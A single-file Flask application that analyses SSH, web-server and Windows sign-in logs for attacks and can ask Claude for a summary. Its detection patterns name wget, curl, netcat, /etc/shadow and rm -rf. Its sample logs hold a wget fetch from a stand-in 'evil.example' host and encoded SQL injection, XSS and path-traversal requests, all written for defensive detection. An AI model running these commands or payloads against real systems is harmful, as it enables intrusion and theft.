"""
AI Log Analyzer - complete working app (single file)

Run:   pip install flask anthropic
       python log_analyzer.py        (your browser opens automatically)

Real data: 'Scan this Windows PC' reads sign-in events (needs Administrator).
           'Live monitoring' follows a growing log file and raises alerts.

How it works:
  1. You paste/upload SSH or web-server logs in the browser.
  2. The rule engine (analyze) finds attacks, scores risk, explains why and how to fix.
  3. Optional: Claude (ai_report) reads the findings and writes an expert summary.
"""
import json, os, re, subprocess, threading, time, webbrowser
from collections import Counter
from urllib.parse import unquote
from flask import Flask, Response, jsonify, request

app = Flask(__name__)

# ---------- detection patterns ----------
FAIL = re.compile(r"Failed password for (?:invalid user )?(\S+) from (\S+)")
OK = re.compile(r"Accepted (\w+) for (\S+) from (\S+)")
BAD = re.compile(r"(wget|curl|nc |netcat|chmod \+x|base64 -d|/etc/shadow|rm -rf)")
WEB = re.compile(r'^(\S+) \S+ \S+ \[([^\]]+)\] "(\S+) (\S+)[^"]*" (\d{3}) \S+(?: "[^"]*" "([^"]*)")?')
SQLI = re.compile(r"(union\s+select|\bor\s+1=1|'\s*or\s*'|sleep\(|information_schema|;\s*drop\s)", re.I)
XSS = re.compile(r"(<script|onerror\s*=|javascript:)", re.I)
TRAV = re.compile(r"(\.\./|/etc/passwd|boot\.ini)", re.I)
SCANUA = re.compile(r"(sqlmap|nikto|nmap|masscan|dirbuster)", re.I)
ORDER = ["critical", "high", "medium", "low"]


def analyze(text):
    """Rule engine: returns risk score, problems, fixes, charts data, timeline."""
    lines = [l for l in text.splitlines() if l.strip()]
    ssh_fail, users, hits, web404 = Counter(), Counter(), Counter(), Counter()
    finds, tl, seen, risk = [], [], set(), 0

    def add(sev, key, title, ev, why, fix, pts):
        nonlocal risk
        if key in seen:
            return
        seen.add(key)
        risk += pts
        finds.append(dict(sev=sev, t=title, ev=ev[:200], why=why, fix=fix))

    for l in lines:
        m = FAIL.search(l)
        if m:
            users[m[1]] += 1
            ssh_fail[m[2]] += 1
    hits.update(ssh_fail)

    for l in lines:
        ts = l[:19]
        m = FAIL.search(l)
        if m:
            tl.append([ts, f"Failed login: {m[1]} from {m[2]}", "medium"])
            continue
        m = OK.search(l)
        if m:
            how, u, a = m.groups()
            if ssh_fail[a] >= 3:
                if a == "local":
                    add("medium", f"take{u}{a}", f"Sign-in for '{u}' succeeded after repeated wrong passwords", l,
                        "Several wrong passwords were entered, then a sign-in worked. It may be a typo, or someone guessing at the lock screen.",
                        "If it was not you: change the Windows password, set up a PIN or Windows Hello, and check who has physical access.", 10)
                else:
                    add("critical", f"take{u}{a}", f"Possible account takeover: '{u}' logged in after failures", l,
                        f"The same address ({a}) failed repeatedly, then got in. The password was probably guessed.",
                        f"Kill active sessions for {u}. Reset its password and rotate keys. Check shell history and new cron jobs.", 40)
                tl.append([ts, f"Login for {u} from {a} after failures", "critical"])
            else:
                tl.append([ts, f"Normal login: {u} ({how}) from {a}", "low"])
            if u == "root" and how == "password":
                add("medium", "rootpw", "Root logged in with a password", l,
                    "Root over password is the most attacked entry point on any server.",
                    "Set PermitRootLogin no and PasswordAuthentication no in /etc/ssh/sshd_config, then restart sshd.", 10)
            continue
        w = WEB.match(l)
        if w:
            ip, wts, meth, path, status, ua = w.groups()
            p, ua, flagged = unquote(path), ua or "", False
            if SQLI.search(p):
                add("critical", "sqli" + ip, f"SQL injection attempt from {ip}", l,
                    "The attacker is trying to read or change your database through a web form or URL.",
                    "Use parameterized queries, validate input, and put a web application firewall in front. Block the IP.", 35)
                flagged = True
            if XSS.search(p):
                add("high", "xss" + ip, f"Cross-site scripting (XSS) attempt from {ip}", l,
                    "Injected scripts can steal user sessions or deface pages.",
                    "Escape all user output, add a Content-Security-Policy header, and sanitize input.", 20)
                flagged = True
            if TRAV.search(p):
                add("high", "trav" + ip, f"Path traversal attempt from {ip}", l,
                    "The attacker is trying to read files outside the web folder, such as /etc/passwd.",
                    "Never build file paths from user input. Run the web server as a low-privilege user.", 30)
                flagged = True
            if SCANUA.search(ua):
                add("medium", "ua" + ip, f"Hacking tool detected from {ip}", l,
                    f"The client identifies itself with a known attack tool ({ua[:30]}).",
                    "Block this user agent and IP at the firewall or WAF.", 15)
                flagged = True
            if status == "404":
                web404[ip] += 1
            if flagged:
                hits[ip] += 1
            tl.append([wts[:20], f"{'Web attack' if flagged else 'Request'} from {ip}: {meth} {p[:50]}",
                       "high" if flagged else "low"])
            continue
        if BAD.search(l):
            add("high", "bad" + l[20:60], "Suspicious command executed", l,
                "Downloading or running unknown scripts is a common step after a break-in.",
                "Isolate the host. Find and delete the downloaded file. Review running processes and scheduled tasks. Restore from a clean backup if unsure.", 20)
            tl.append([ts, "Suspicious command: " + l[20:90], "high"])
        else:
            tl.append([ts, l[20:90], "low"])

    for a, n in ssh_fail.items():
        if n >= 3:
            if a == "local":
                add("medium", "bf" + a, "Repeated failed sign-ins on this PC", f"{n} failed sign-ins at this computer",
                    "Many wrong passwords were typed at this machine. Someone may be trying to guess a password.",
                    "Use a long password or PIN, turn on account lockout, and keep the PC locked when away.", 15)
            else:
                add("high", "bf" + a, f"Brute-force attack from {a}", f"{n} failed logins from {a}",
                    "An attacker is guessing passwords automatically. Given time, one guess may succeed.",
                    f"Block {a} at the firewall. Install fail2ban to auto-ban repeat offenders. Switch SSH to key-only login.", 30)
    for a, n in web404.items():
        if n >= 5:
            hits[a] += n
            add("medium", "scan" + a, f"Directory scanning from {a}", f"{n} requests returned 404 from {a}",
                "Someone is probing for hidden admin pages, config files and backups.",
                "Rate-limit the IP, hide admin paths, and make sure .env and .git are never publicly served.", 20)

    risk = min(risk, 100)
    sev = "critical" if risk >= 80 else "high" if risk >= 50 else "medium" if risk >= 20 else "low"
    finds.sort(key=lambda f: ORDER.index(f["sev"]))
    return dict(lines=len(lines), ip=dict(hits), usr=dict(users), finds=finds, tl=tl[:80],
                risk=risk, sev=sev, nf=sum(hits.values()))


def ai_report(logs, res, key):
    """LLM layer: Claude reads the rule-engine findings and writes an expert summary."""
    import anthropic
    prompt = ("You are a senior SOC analyst. Reply ONLY with JSON: "
              '{"summary":"2-3 sentences","attack_stage":"e.g. initial access","actions":["top 3-5 actions in priority order"]}\n\n'
              f"RISK: {res['risk']}/100\nFINDINGS: {json.dumps([f['t'] for f in res['finds']])}\n\nLOGS:\n{logs[:6000]}")
    msg = anthropic.Anthropic(api_key=key).messages.create(
        model="claude-sonnet-5-5", max_tokens=1000, messages=[{"role": "user", "content": prompt}])
    d = json.loads(msg.content[0].text.replace("```json", "").replace("```", "").strip())
    return dict(summary=d.get("summary", ""), attack_stage=d.get("attack_stage", "unknown"), actions=d.get("actions", []))


@app.get("/")
def home():
    return Response(PAGE, mimetype="text/html")


@app.post("/api/analyze")
def api_analyze():
    d = request.get_json(force=True)
    logs = d.get("logs", "")
    res = analyze(logs)
    res["ai"] = None
    if d.get("use_ai"):
        key = d.get("api_key") or os.getenv("ANTHROPIC_API_KEY", "")
        if not key:
            res["ai"] = {"error": "No API key. Paste one above or set ANTHROPIC_API_KEY."}
        else:
            try:
                res["ai"] = ai_report(logs, res, key)
            except Exception as e:
                res["ai"] = {"error": f"AI step failed: {e}"}
    return jsonify(res)


# ---------- real data: Windows sign-in events ----------
@app.post("/api/windows")
def api_windows():
    if os.name != "nt":
        return jsonify(error="This button works only on Windows.")
    try:
        hours = max(1, min(int((request.get_json(silent=True) or {}).get("hours", 24)), 168))
        ps = ("$ErrorActionPreference='Stop';"
              f"$e=Get-WinEvent -FilterHashtable @{{LogName='Security';Id=4624,4625;StartTime=(Get-Date).AddHours(-{hours})}} -MaxEvents 1500;"
              "foreach($x in $e){$p=$x.Properties;$t=$x.TimeCreated.ToString('yyyy-MM-dd HH:mm:ss');"
              "if($x.Id -eq 4625){\"$t|F|$($p[5].Value)|$($p[19].Value)|0\"}"
              "else{\"$t|A|$($p[5].Value)|$($p[18].Value)|$($p[8].Value)\"}}")
        r = subprocess.run(["powershell", "-NoProfile", "-Command", ps], capture_output=True, text=True, timeout=90)
        err = (r.stderr or "").lower()
        if r.returncode != 0:
            if "no events were found" in err:
                return jsonify(lines=[])
            if "unauthorized" in err or "access" in err or "privilege" in err:
                return jsonify(error="Windows needs Administrator rights to read the Security log. Close VS Code, right-click it, choose Run as administrator, then try again.")
            return jsonify(error="PowerShell error: " + (r.stderr or "")[:200])
        out = []
        for row in reversed([x for x in r.stdout.splitlines() if x.count("|") == 4]):
            ts, kind, user, ip, lt = row.split("|")
            user = user.strip().replace(" ", "_")
            if not user or user.endswith("$") or user in ("-", "SYSTEM", "LOCAL_SERVICE", "NETWORK_SERVICE") or user.startswith(("DWM-", "UMFD-")):
                continue
            if kind == "A" and lt not in ("2", "3", "7", "10", "11"):
                continue
            ip = "local" if ip.strip() in ("", "-", "::1", "127.0.0.1") else ip.strip()
            out.append(f"{ts} winlogon {'Failed' if kind == 'F' else 'Accepted'} password for {user} from {ip}")
        return jsonify(lines=out)
    except Exception as e:
        return jsonify(error=f"Could not read Windows events: {e}")


# ---------- live monitoring: follow a growing log file ----------
@app.post("/api/watch")
def api_watch():
    d = request.get_json(force=True)
    path = str(d.get("path", "")).strip().strip('"')
    off = int(d.get("offset", -1))
    try:
        if not os.path.isfile(path):
            return jsonify(error=f"File not found: {path}")
        size = os.path.getsize(path)
        fresh = off < 0 or off > size  # first read, or the file was reset/rotated
        start = max(0, size - 65536) if fresh else off
        with open(path, "rb") as f:
            f.seek(start)
            data = f.read(2_000_000)
        cut = data.rfind(b"\n") + 1  # only complete lines
        lines = data[:cut].decode("utf-8", "ignore").splitlines()
        if fresh:
            lines = (lines[1:] if start > 0 else lines)[-200:]
        return jsonify(lines=lines, offset=start + cut)
    except Exception as e:
        return jsonify(error=str(e))


DEMO = os.path.join(os.path.dirname(os.path.abspath(__file__)), "demo_live.log")
DEMO_STATE = {"stop": None}
DEMO_SCRIPT = ["sshd Accepted publickey for alice from 10.0.0.5", "cron job backup completed",
               "sshd Failed password for bob from 10.0.0.8", "sshd Accepted publickey for bob from 10.0.0.8",
               "cron job backup completed", "sshd Failed password for root from 203.0.113.9",
               "sshd Failed password for root from 203.0.113.9", "sshd Failed password for admin from 203.0.113.9",
               "sshd Failed password for root from 203.0.113.9", "sshd Accepted password for root from 203.0.113.9",
               "sudo user root ran: wget http://evil.example/x.sh", "cron job backup completed",
               "sshd Accepted publickey for alice from 10.0.0.5"]


def demo_writer(stop):
    i = 0
    while not stop.is_set():
        with open(DEMO, "a") as f:
            f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} {DEMO_SCRIPT[i % len(DEMO_SCRIPT)]}\n")
        i += 1
        stop.wait(2)


@app.post("/api/demo")
def api_demo():
    """Writes a fake log line every 2 seconds so you can see live monitoring work."""
    if DEMO_STATE["stop"]:
        DEMO_STATE["stop"].set()
    open(DEMO, "w").close()
    ev = threading.Event()
    DEMO_STATE["stop"] = ev
    threading.Thread(target=demo_writer, args=(ev,), daemon=True).start()
    return jsonify(path=DEMO)


# ---------- dashboard page (HTML/CSS/JS) ----------
PAGE = r'''<!DOCTYPE html>
<html lang="en"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
<title>AI Log Analyzer</title>
<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Sans:wght@400;500;600&family=IBM+Plex+Mono:wght@400;500&display=swap" rel="stylesheet">
<style>
:root{--bg:#eef2f6;--card:#fff;--ink:#14213d;--mute:#5b6b82;--line:#d8e0ea;--crit:#b42318;--high:#c4521b;--med:#a16207;--low:#067647;--acc:#0f5c8a;--accbg:#e3f0f8;
box-sizing:border-box;padding-top:env(safe-area-inset-top,0px);padding-bottom:env(safe-area-inset-bottom,0px)}
@media(prefers-color-scheme:dark){:root:not([data-theme="light"]){--bg:#0f1826;--card:#18253a;--ink:#e6edf7;--mute:#93a4bd;--line:#2a3b56;--crit:#ff7b72;--high:#ffa066;--med:#e3b341;--low:#56d364;--acc:#79c0ff;--accbg:#1d3550}}
:root[data-theme="dark"]{--bg:#0f1826;--card:#18253a;--ink:#e6edf7;--mute:#93a4bd;--line:#2a3b56;--crit:#ff7b72;--high:#ffa066;--med:#e3b341;--low:#56d364;--acc:#79c0ff;--accbg:#1d3550}
*{box-sizing:border-box}html{scroll-padding-top:env(safe-area-inset-top,0px)}
body{margin:0;background:var(--bg);color:var(--ink);font:15px/1.5 "IBM Plex Sans",system-ui,sans-serif}
.wrap{max-width:1040px;margin:0 auto;padding:18px 16px 40px}
h1{font-size:22px;margin:0}h2{font-size:16px;margin:0 0 10px}
.sub{color:var(--mute);margin:2px 0 16px}
.card{background:var(--card);border:1px solid var(--line);border-radius:10px;padding:16px;margin-bottom:14px}
textarea{width:100%;height:170px;border:1px solid var(--line);border-radius:8px;background:var(--bg);color:var(--ink);font:12.5px/1.5 "IBM Plex Mono",monospace;padding:10px;resize:vertical}
.row{display:flex;gap:10px;flex-wrap:wrap;margin-top:10px}
button{font:inherit;font-weight:500;border-radius:8px;padding:9px 16px;cursor:pointer;border:1px solid var(--line);background:var(--card);color:var(--ink)}
button.p{background:var(--acc);border-color:var(--acc);color:#fff}
@media(prefers-color-scheme:dark){button.p{color:#0f1826}}
button:focus-visible,textarea:focus-visible{outline:2px solid var(--acc);outline-offset:2px}
.top{display:grid;grid-template-columns:200px 1fr;gap:14px}
@media(max-width:700px){.top{grid-template-columns:1fr}}
.gauge{text-align:center}.gauge svg{width:160px;height:160px}
.sev{display:inline-block;font-weight:600;padding:2px 12px;border-radius:99px;color:#fff;margin-top:4px}
.kpis{display:grid;grid-template-columns:repeat(3,1fr);gap:10px;margin-top:12px}
.kpi{background:var(--bg);border-radius:8px;padding:10px}.kpi b{font-size:22px;display:block}.kpi span{color:var(--mute);font-size:13px}
.f{border:1px solid var(--line);border-left:5px solid var(--c);border-radius:8px;padding:12px;margin-bottom:10px}
.f h3{margin:0 0 4px;font-size:15px}.f p{margin:2px 0;color:var(--mute)}.f p b{color:var(--ink);font-weight:600}
.ev{font:12px "IBM Plex Mono",monospace;background:var(--bg);padding:6px 8px;border-radius:6px;overflow-x:auto;white-space:pre;margin-top:6px}
.bar{display:flex;align-items:center;gap:8px;margin:6px 0;font-size:13px}.bar i{display:block;height:14px;background:var(--crit);border-radius:3px}.bar span{min-width:110px;font-family:"IBM Plex Mono",monospace}
.tl{border-left:2px solid var(--line);margin-left:6px;padding-left:14px}
.t{position:relative;margin-bottom:8px;font-size:13px}.t:before{content:"";position:absolute;left:-20px;top:6px;width:10px;height:10px;border-radius:50%;background:var(--c,var(--mute))}
.t code{font-family:"IBM Plex Mono",monospace;font-size:12px;color:var(--mute)}
.scroll{overflow-x:auto}.hide{display:none}
label{display:flex;align-items:center;gap:6px}#aicard ul{margin:6px 0 0;padding-left:20px}input[type=file]{max-width:210px}.al{border-left:4px solid var(--c);padding:6px 10px;margin-top:6px;background:var(--bg);border-radius:6px;font-size:13px}.in{padding:8px;border:1px solid var(--line);border-radius:8px;background:var(--bg);color:var(--ink)}</style></head><body><div class="wrap">
<h1>AI Log Analyzer</h1>
<p class="sub">Paste SSH or web-server logs, or upload a file. The engine finds the problem, explains why it matters, and tells you how to fix it.</p>
<div class="card"><h2>Logs</h2>
<textarea id="logs" aria-label="Log input" spellcheck="false"></textarea>
<div class="row"><button class="p" id="go">Analyze logs</button><button id="sample">Load sample attack</button><button id="clean">Load normal logs</button><button id="web">Load web-attack sample</button><button id="clear">Clear</button></div><div class="row"><input type="file" id="file" accept=".log,.txt" aria-label="Upload log file"><label><input type="checkbox" id="ai"> Use AI (Claude)</label><input type="password" id="key" placeholder="Anthropic API key (optional)" aria-label="API key" style="flex:1;min-width:200px;padding:8px;border:1px solid var(--line);border-radius:8px;background:var(--bg);color:var(--ink)"><button id="dl" class="hide">Download report</button></div></div>
<div class="card"><h2>Real data sources</h2>
<div class="row" style="margin-top:0"><button id="win">Scan this Windows PC (last 24 hours)</button><span id="wstat" style="color:var(--mute);align-self:center"></span></div>
<hr style="border:0;border-top:1px solid var(--line);margin:14px 0">
<h2>Live monitoring</h2>
<div class="row" style="margin-top:0"><input class="in" id="wpath" aria-label="Log file path" placeholder="Full path of a log file, e.g. C:\logs\access.log" style="flex:1;min-width:220px"><button class="p" id="watch">Watch file</button><button id="demo">Start live demo</button><button id="stop" class="hide">Stop</button></div>
<p id="lstat" style="color:var(--mute);margin:8px 0 0">Not watching. Tap "Start live demo" to see it work.</p><div id="alerts"></div></div>
<div id="out" class="hide">
<div class="top"><div class="card gauge"><h2>Risk score</h2><svg viewBox="0 0 120 120" role="img" aria-label="Risk gauge"><circle cx="60" cy="60" r="50" fill="none" stroke="var(--line)" stroke-width="12"/><circle id="ring" cx="60" cy="60" r="50" fill="none" stroke="var(--crit)" stroke-width="12" stroke-linecap="round" stroke-dasharray="314" stroke-dashoffset="314" transform="rotate(-90 60 60)" style="transition:stroke-dashoffset .8s ease"/><text id="num" x="60" y="68" text-anchor="middle" font-size="28" font-weight="600" fill="var(--ink)">0</text></svg><div><span class="sev" id="sev"></span></div></div>
<div class="card"><h2>Summary</h2><p id="sum" style="margin:0"></p><div class="kpis"><div class="kpi"><b id="k1"></b><span>log lines</span></div><div class="kpi"><b id="k2"></b><span>problems found</span></div><div class="kpi"><b id="k3"></b><span>suspicious events</span></div></div></div></div>
<div class="card"><h2>Problems and how to fix them</h2><div id="finds"></div></div>
<div class="top" style="grid-template-columns:1fr 1fr"><div class="card"><h2>Suspicious activity by IP</h2><div id="ips"></div></div><div class="card"><h2>Accounts targeted</h2><div id="usr"></div></div></div>
<div class="card"><h2>Event timeline</h2><div class="tl" id="tl"></div></div>
<div class="card" id="aicard"></div>
</div></div>
<script>
const SAMPLE=`2026-10-07 09:01:12 sshd Failed password for root from 203.0.113.9
2026-10-07 09:01:15 sshd Failed password for root from 203.0.113.9
2026-10-07 09:01:19 sshd Failed password for admin from 203.0.113.9
2026-10-07 09:01:25 sshd Failed password for root from 203.0.113.9
2026-10-07 09:02:02 sshd Accepted password for root from 203.0.113.9
2026-10-07 09:05:40 sudo user root ran: wget http://evil.example/x.sh
2026-10-07 09:06:01 cron job backup completed
2026-10-07 09:10:22 sshd Accepted publickey for alice from 10.0.0.5`;
const CLEAN=`2026-10-07 08:00:01 sshd Accepted publickey for alice from 10.0.0.5
2026-10-07 08:15:10 cron job backup completed
2026-10-07 09:30:44 sshd Failed password for bob from 10.0.0.8
2026-10-07 09:30:52 sshd Accepted publickey for bob from 10.0.0.8`;
const $=id=>document.getElementById(id);
const COL={critical:'var(--crit)',high:'var(--high)',medium:'var(--med)',low:'var(--low)'};
const esc=s=>String(s).replace(/[&<>"]/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;'}[c]));
function bars(o,el){const e=Object.entries(o);const mx=Math.max(1,...e.map(x=>x[1]));el.innerHTML=e.length?e.map(([k,v])=>`<div class="bar"><span>${esc(k)}</span><i style="width:${v/mx*55}%"></i>${v}</div>`).join(''):'<p style="color:var(--mute);margin:0">No failed logins found.</p>'}
const WEBS=`203.0.113.50 - - [07/Oct/2026:10:00:01 +0000] "GET /products?id=1%27%20OR%201%3D1-- HTTP/1.1" 200 512 "-" "sqlmap/1.7"
203.0.113.50 - - [07/Oct/2026:10:00:02 +0000] "GET /products?id=1%20UNION%20SELECT%20user,pass%20FROM%20users HTTP/1.1" 500 120 "-" "sqlmap/1.7"
198.51.100.7 - - [07/Oct/2026:10:01:10 +0000] "GET /search?q=%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.1" 200 800 "-" "Mozilla/5.0"
198.51.100.7 - - [07/Oct/2026:10:01:15 +0000] "GET /download?file=../../etc/passwd HTTP/1.1" 403 90 "-" "Mozilla/5.0"
192.0.2.44 - - [07/Oct/2026:10:02:01 +0000] "GET /wp-login.php HTTP/1.1" 404 150 "-" "Mozilla/5.0"
192.0.2.44 - - [07/Oct/2026:10:02:02 +0000] "GET /.env HTTP/1.1" 404 150 "-" "Mozilla/5.0"
192.0.2.44 - - [07/Oct/2026:10:02:03 +0000] "GET /phpmyadmin/ HTTP/1.1" 404 150 "-" "Mozilla/5.0"
192.0.2.44 - - [07/Oct/2026:10:02:04 +0000] "GET /.git/config HTTP/1.1" 404 150 "-" "Mozilla/5.0"
192.0.2.44 - - [07/Oct/2026:10:02:05 +0000] "GET /xmlrpc.php HTTP/1.1" 404 150 "-" "Mozilla/5.0"
10.0.0.7 - - [07/Oct/2026:10:03:00 +0000] "GET / HTTP/1.1" 200 2048 "-" "Mozilla/5.0"`;
let LAST=null;
async function run(text){
 $('go').disabled=true;$('go').textContent='Analyzing...';
 try{const res=await fetch('/api/analyze',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({logs:text,api_key:$('key').value,use_ai:$('ai').checked})});
 const r=await res.json();LAST=r;render(r);showAI(r.ai);$('dl').classList.remove('hide')}
 catch(e){alert('Could not reach the analyzer: '+e)}
 $('go').disabled=false;$('go').textContent='Analyze logs'}
function showAI(a){const c=$('aicard');
 if(!a){c.innerHTML='<h2>AI analysis</h2><p style="margin:0;color:var(--mute)">Off. Tick "Use AI (Claude)" and add an API key for an expert-written summary.</p>';return}
 if(a.error){c.innerHTML='<h2>AI analysis</h2><p style="margin:0;color:var(--crit)">'+esc(a.error)+'</p>';return}
 c.innerHTML='<h2>AI analysis (Claude)</h2><p><b>Attack stage:</b> '+esc(a.attack_stage)+'</p><p>'+esc(a.summary)+'</p><ul>'+a.actions.map(x=>'<li>'+esc(x)+'</li>').join('')+'</ul>'}
function render(r,quiet){
 $('out').classList.remove('hide');const c=COL[r.sev];
 $('ring').style.stroke=c;$('ring').style.strokeDashoffset=314-314*r.risk/100;$('num').textContent=r.risk;
 $('sev').textContent=r.sev;$('sev').style.background=c;
 $('sum').textContent=r.finds.length?`${r.finds.length} problem(s) found across ${r.lines} log lines. Risk is ${r.sev}. Start with the red items below.`:`No threats found in ${r.lines} log lines. Activity looks normal.`;
 $('k1').textContent=r.lines;$('k2').textContent=r.finds.length;$('k3').textContent=r.nf;
 $('finds').innerHTML=r.finds.length?r.finds.sort((a,b)=>Object.keys(COL).indexOf(a.sev)-Object.keys(COL).indexOf(b.sev)).map(f=>`<div class="f" style="--c:${COL[f.sev]}"><h3>${esc(f.t)}</h3><p><b>Why it matters:</b> ${esc(f.why)}</p><p><b>How to fix:</b> ${esc(f.fix)}</p><div class="ev">${esc(f.ev)}</div></div>`).join(''):'<p style="margin:0;color:var(--mute)">Nothing to fix.</p>';
 bars(r.ip,$('ips'));bars(r.usr,$('usr'));
 $('tl').innerHTML=r.tl.map(([t,m,s])=>`<div class="t" style="--c:${COL[s]}"><code>${esc(t)}</code><br>${esc(m)}</div>`).join('');
 if(!quiet)$('out').scrollIntoView({behavior:matchMedia('(prefers-reduced-motion: reduce)').matches?'auto':'smooth'})}
$('go').onclick=()=>run($('logs').value);
$('sample').onclick=()=>{$('logs').value=SAMPLE;run(SAMPLE)};
$('clean').onclick=()=>{$('logs').value=CLEAN;run(CLEAN)};
$('web').onclick=()=>{$('logs').value=WEBS;run(WEBS)};
$('clear').onclick=()=>{$('logs').value='';$('out').classList.add('hide')};
$('file').onchange=e=>{const f=e.target.files[0];if(!f)return;const r=new FileReader();r.onload=()=>{$('logs').value=r.result;run(r.result)};r.readAsText(f)};
$('dl').onclick=()=>{if(!LAST)return;const r=LAST;let t=`AI LOG ANALYZER REPORT\nRisk: ${r.risk}/100 (${r.sev})\nLog lines: ${r.lines}\n\nPROBLEMS\n`+r.finds.map((f,i)=>`${i+1}. [${f.sev}] ${f.t}\n   Why: ${f.why}\n   Fix: ${f.fix}\n   Evidence: ${f.ev}`).join('\n\n');
 if(r.ai&&r.ai.summary)t+=`\n\nAI SUMMARY\n${r.ai.summary}\nStage: ${r.ai.attack_stage}\n`+r.ai.actions.map(x=>'- '+x).join('\n');
 const a=document.createElement('a');a.href=URL.createObjectURL(new Blob([t],{type:'text/plain'}));a.download='log-report.txt';a.click()};
let timer=null,buf=[],off=-1,known=new Set(),alerts=[],wpath='';
const J={'Content-Type':'application/json'};
function stopLive(msg){clearInterval(timer);timer=null;$('stop').classList.add('hide');$('watch').disabled=false;$('lstat').textContent=msg||'Stopped.'}
async function startLive(path){
 clearInterval(timer);wpath=path;off=-1;buf=[];known=new Set();alerts=[];$('alerts').innerHTML='';
 $('stop').classList.remove('hide');$('watch').disabled=true;await poll();if(wpath===path&&$('watch').disabled)timer=setInterval(poll,2000)}
async function poll(){
 try{const r=await(await fetch('/api/watch',{method:'POST',headers:J,body:JSON.stringify({path:wpath,offset:off})})).json();
 if(r.error){stopLive(r.error);return}
 off=r.offset;
 if(r.lines.length){buf=buf.concat(r.lines).slice(-500);
  const a=await(await fetch('/api/analyze',{method:'POST',headers:J,body:JSON.stringify({logs:buf.join('\n'),use_ai:false})})).json();
  LAST=a;render(a,true);showAI(null);$('dl').classList.remove('hide');
  a.finds.forEach(f=>{if(!known.has(f.t)){known.add(f.t);alerts.unshift([new Date().toLocaleTimeString(),f])}});
  $('alerts').innerHTML=alerts.map(([t,f])=>`<div class="al" style="--c:${COL[f.sev]}"><b>${esc(t)}</b> ${esc(f.sev)}: ${esc(f.t)}</div>`).join('')}
 $('lstat').textContent='LIVE: watching '+wpath+' | '+buf.length+' recent lines | checked '+new Date().toLocaleTimeString()}
 catch(e){stopLive('Lost connection to the app: '+e)}}
$('win').onclick=async()=>{$('wstat').textContent='Reading the Windows Security log (10-30 seconds)...';$('win').disabled=true;
 try{const r=await(await fetch('/api/windows',{method:'POST',headers:J,body:JSON.stringify({hours:24})})).json();
  if(r.error)$('wstat').textContent=r.error;
  else if(!r.lines.length)$('wstat').textContent='No sign-in events found in the last 24 hours.';
  else{$('wstat').textContent='Read '+r.lines.length+' sign-in events from this PC.';$('logs').value=r.lines.join('\n');run($('logs').value)}}
 catch(e){$('wstat').textContent='Failed: '+e}
 $('win').disabled=false};
$('watch').onclick=()=>{const p=$('wpath').value.trim().replace(/^"|"$/g,'');if(!p){$('lstat').textContent='Type the full path of a log file first.';return}startLive(p)};
$('demo').onclick=async()=>{const r=await(await fetch('/api/demo',{method:'POST'})).json();$('wpath').value=r.path;startLive(r.path)};
$('stop').onclick=()=>stopLive('Stopped.');
showAI(null);
$('logs').value=SAMPLE;
</script></body></html>
'''

if __name__ == "__main__":
    threading.Timer(1.2, lambda: webbrowser.open("http://127.0.0.1:5000")).start()
    print("AI Log Analyzer running at http://127.0.0.1:5000  (Ctrl+C to stop)")
    app.run(host="127.0.0.1", port=5000)
